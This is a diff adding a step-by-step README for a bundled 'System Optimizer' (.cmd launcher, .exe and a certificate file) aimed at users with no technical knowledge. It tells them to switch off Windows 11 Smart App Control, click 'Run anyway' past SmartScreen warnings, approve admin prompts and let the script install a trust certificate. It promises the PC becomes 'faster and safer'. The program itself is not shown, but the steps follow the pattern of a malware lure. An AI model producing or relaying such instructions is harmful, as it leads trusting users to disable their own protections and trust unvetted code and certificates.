@@ -1,0 +1,112 @@
+HOW TO OPTIMIZE YOUR PC - EASY STEP-BY-STEP
+============================================
+(No technical knowledge needed. Just follow these steps in order.)
+
+--------------------------------------------------------------------
+WHAT YOU NEED
+--------------------------------------------------------------------
+You need this folder copied onto the PC you want to fix.
+You can copy it with a USB stick, or move it from your Downloads.
+
+The important files are:
+  - 1-Click-System-Optimizer.cmd   (the yellow/gear file that starts it)
+  - SystemOptimizer.exe            (the program)
+  - WSO-Trust.cer                  (a small certificate file)
+
+Keep all of them in the SAME folder. Do not delete any.
+
+--------------------------------------------------------------------
+STEP 0 - (ONLY IF YOU ARE ON WINDOWS 11)
+--------------------------------------------------------------------
+Windows 11 has a safety feature called "Smart App Control" that can
+stop our program. If you see this folder on a Windows 11 computer,
+do this first to turn it off:
+
+  1. Click the START button (the Windows logo, bottom-left).
+  2. Type:  Smart App Control
+  3. Click "Smart App Control" in the search results.
+  4. Set it to "Off".
+  5. Restart the computer (Start > Power > Restart).
+
+If you are on Windows 10, skip this step - it is not there.
+
+--------------------------------------------------------------------
+STEP 1 - START THE PROGRAM
+--------------------------------------------------------------------
+  1. Find the file called:  1-Click-System-Optimizer.cmd
+  2. DOUBLE-CLICK it.
+     (If you see "Windows protected your PC", click:
+        "More info"  then  "Run anyway".)
+  3. A blue window may open and ask: "Do you want to allow this app
+     to make changes?"  ->  Click  YES.
+  4. It will install a small certificate and open the program window.
+     Wait a moment. The program is called  SYSTEM OPTIMIZER.
+
+--------------------------------------------------------------------
+STEP 2 - WHAT TO TICK (you do not need to change anything)
+--------------------------------------------------------------------
+When the program opens you will see two tabs and some checkboxes.
+All the SAFE boxes are already ticked for you.
+
+  - Tab "Performance & Services":  leave all ticked boxes as they are.
+  - Tab "Security & Hardening":    leave all ticked boxes as they are.
+
+Just leave everything as it is. Do not untick anything.
+
+(You only need to untick a box if it says it is OPTIONAL and you know
+ you DO use that feature - for example Bluetooth or printing. Most
+ people can leave everything ticked.)
+
+--------------------------------------------------------------------
+STEP 3 - APPLY EVERYTHING
+--------------------------------------------------------------------
+At the bottom of the window there are buttons.
+Click the button that says:
+
+      Apply ALL selected
+
+Then click YES if it asks to allow changes.
+
+A box will say "Finished". Click OK.
+
+--------------------------------------------------------------------
+STEP 4 - RESTART THE COMPUTER
+--------------------------------------------------------------------
+ 1. Save any work you have open.
+ 2. Click START > Power > Restart.
+ 3. Wait for the computer to come back on.
+
+That's it - you are done! Your PC is now faster and safer.
+
+--------------------------------------------------------------------
+HOW TO UNDO IT (if you ever want to go back)
+--------------------------------------------------------------------
+If you ever want to put everything back to how it was before:
+
+  1. Double-click  1-Click-System-Optimizer.cmd  again.
+     Click YES if it asks to allow changes.
+  2. At the bottom, click the button that says:
+
+          Restore ALL to defaults
+
+  3. Click YES / OK.
+  4. Restart the computer.
+
+--------------------------------------------------------------------
+TROUBLESHOOTING
+--------------------------------------------------------------------
+- "Windows protected your PC" appears  ->  click "More info" then
+  "Run anyway".
+
+- Program does not open on Windows 11  ->  go back to STEP 0 and make
+  sure Smart App Control is OFF, then restart.
+
+- "This file can't be found"  ->  all the files must be in the same
+  folder. Put the files together and try again.
+
+- Not sure what something means  ->  in the program, click the
+  "Help / settings guide" button for a full explanation.
+
+--------------------------------------------------------------------
+DONE! You did it. Your computer is now cleaned up and protected.
+--------------------------------------------------------------------
